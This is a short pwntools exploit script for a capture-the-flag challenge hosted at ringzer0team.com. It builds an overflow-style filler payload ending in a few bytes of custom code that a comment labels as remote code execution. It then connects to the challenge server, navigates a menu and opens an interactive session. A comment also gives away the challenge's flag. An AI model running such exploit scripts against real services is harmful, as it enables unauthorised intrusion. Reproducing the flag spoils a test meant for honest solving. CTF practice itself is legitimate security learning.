from pwn import *

# FLAG-LookLikeNc8IsntThatSecureAfterAll

# .rce
#   xor r0, r0
#   int 4
#   int 0
# .jmp
#   jmp .rce  (At 0x00e1) (steps 732616)

payload = flat([
    (b"A"*32+b"B"*32)*508, # filler 0x00BE..

    b"C"*32,

    b"\x50\x04\x00\xCD"
])

io = remote("challenges.ringzer0team.com", 10283)

# Attach Service
io.sendlineafter(b"ENTER ACTION> ", b"3")
io.sendlineafter(b"ENTER SERVICE ID> ", b"3")

io.sendlineafter(b"PLEASE ENTER CODE #4", payload)

io.interactive()
